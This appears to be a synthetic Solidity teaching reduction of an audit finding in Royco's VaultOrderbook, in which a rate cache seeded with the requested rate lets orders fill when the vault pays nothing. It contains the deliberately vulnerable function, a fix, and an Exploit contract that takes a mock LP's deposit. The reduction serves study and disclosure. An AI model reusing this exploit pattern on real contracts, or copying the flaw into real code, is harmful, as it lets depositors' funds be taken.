// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Royco — VaultOrderbook.allocateOrder seeds tokenToRate with the requested rate
    (Cantina, Kurt Barry, finding 46678).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the first loop sets tokenToRate[token] = tokenRatesRequested[i]. The vault
    rate is only added afterwards, so the comparison tokenRatesRequested > tokenToRate can
    never fail. An order is filled when the vault will pay a rate of 0. Vulnerable line
    preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IVault {
    function previewRateAfterDeposit(bytes32 campaignId, uint256 quantity) external view returns (uint256);
}

contract Vault {
    mapping(bytes32 => uint256) public rateOf;

    function setCampaign(bytes32 id, uint256 rate) external {
        rateOf[id] = rate;
    }

    function previewRateAfterDeposit(bytes32 campaignId, uint256) external view returns (uint256) {
        return rateOf[campaignId];
    }
}

contract LP {
    function approveToken(Token token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract VaultOrderbook {
    struct Order {
        address ap;
        address targetVault;
        address[] tokensRequested;
        uint256[] tokenRatesRequested;
    }

    Token public base;
    mapping(address => uint256) public tokenToRate;
    uint256 public taken;
    error OrderConditionsNotMet();

    constructor(Token base_) {
        base = base_;
    }

    function allocateOrder(Order calldata order, bytes32[] calldata campaignIds, uint256 quantity) external {
        for (uint256 i; i < order.tokenRatesRequested.length; ++i) {
            tokenToRate[order.tokensRequested[i]] = order.tokenRatesRequested[i]; // @> VULN: cache starts at the requested rate, so the check below cannot fail
            // FIX: delete this loop so every tokenToRate entry starts at 0
        }
        for (uint256 i = 0; i < campaignIds.length; ++i) {
            uint256 rate = IVault(order.targetVault).previewRateAfterDeposit(campaignIds[i], quantity);
            tokenToRate[order.tokensRequested[i]] += rate;
        }
        for (uint256 i; i < order.tokenRatesRequested.length; ++i) {
            if (order.tokenRatesRequested[i] > tokenToRate[order.tokensRequested[i]]) {
                revert OrderConditionsNotMet();
            }
            delete tokenToRate[order.tokensRequested[i]];
        }
        base.transferFrom(order.ap, msg.sender, quantity);
        taken = quantity;
    }

    function allocateOrderFixed(Order calldata order, bytes32[] calldata campaignIds, uint256 quantity) external {
        for (uint256 i = 0; i < campaignIds.length; ++i) {
            uint256 rate = IVault(order.targetVault).previewRateAfterDeposit(campaignIds[i], quantity);
            tokenToRate[order.tokensRequested[i]] += rate;
        }
        for (uint256 i; i < order.tokenRatesRequested.length; ++i) {
            if (order.tokenRatesRequested[i] > tokenToRate[order.tokensRequested[i]]) {
                revert OrderConditionsNotMet();
            }
            delete tokenToRate[order.tokensRequested[i]];
        }
        base.transferFrom(order.ap, msg.sender, quantity);
        taken = quantity;
    }
}

contract Exploit {
    Token public base; // nonce 1
    Token public realReward; // nonce 2
    Vault public vault; // nonce 3
    VaultOrderbook public book; // nonce 4
    LP public lp; // nonce 5
    uint256 public profit;

    constructor() {
        base = new Token("BASE");
        realReward = new Token("REAL");
        vault = new Vault();
        book = new VaultOrderbook(base);
        lp = new LP();
    }

    function _order() internal view returns (VaultOrderbook.Order memory order, bytes32[] memory campaigns) {
        address[] memory tokens = new address[](1);
        tokens[0] = address(realReward);
        uint256[] memory rates = new uint256[](1);
        rates[0] = 100 ether;
        order = VaultOrderbook.Order({
            ap: address(lp),
            targetVault: address(vault),
            tokensRequested: tokens,
            tokenRatesRequested: rates
        });
        campaigns = new bytes32[](1);
        campaigns[0] = keccak256("real");
    }

    function run() external {
        vault.setCampaign(keccak256("real"), 0);
        base.mint(address(lp), 1000 ether);
        lp.approveToken(base, address(book), 1000 ether);
        (VaultOrderbook.Order memory order, bytes32[] memory campaigns) = _order();
        book.allocateOrder(order, campaigns, 1000 ether);
        uint256 got = base.balanceOf(address(this));
        base.transfer(msg.sender, got);
        profit = base.balanceOf(msg.sender);
        require(profit == 1000 ether, "lp deposit not taken");
        require(realReward.balanceOf(address(lp)) == 0, "lp received a reward");
        require(book.taken() == 1000 ether, "order not filled");
    }

    function runFixed() external {
        vault.setCampaign(keccak256("real"), 0);
        base.mint(address(lp), 1000 ether);
        lp.approveToken(base, address(book), 1000 ether);
        (VaultOrderbook.Order memory order, bytes32[] memory campaigns) = _order();
        book.allocateOrderFixed(order, campaigns, 1000 ether);
    }
}
